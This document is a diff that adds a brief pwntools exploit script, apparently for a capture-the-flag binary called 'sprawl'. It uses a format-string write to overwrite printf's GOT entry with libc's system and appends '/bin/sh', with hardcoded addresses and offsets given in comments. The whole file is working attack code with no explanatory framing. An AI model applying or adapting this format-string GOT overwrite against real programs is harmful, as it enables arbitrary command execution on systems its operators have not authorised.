@@ -1,0 +1,25 @@
+# 0x404018 <printf@got.plt>:    0x00007ffff7c60100  0x0000000000401070
+# Canary inside the format string %23$p
+# AAAAAAAA = 7 in the format string
+from pwn import *
+
+# System 0x7ffff7c58750
+# Libc = 0x7ffff7c00000
+
+#low_got = 0x404018
+#next_got = low_got + 2
+
+printfgot = 0x404018
+libc = 0x7ffff7c00000
+system = libc + 0x58750
+
+context.binary = './sprawl'
+p = process('./sprawl')
+
+payload = fmtstr_payload(6, {printfgot : system})
+payload += b'/bin/sh\x00'
+p.sendlineafter(b'Route tag: ', payload)
+print(len(payload))
+#payload = b'%6$p'
+#payload += p64(low_got) + p64(low_got + 2)
+#p.sendlineafter(b'Route tag: ', payload)
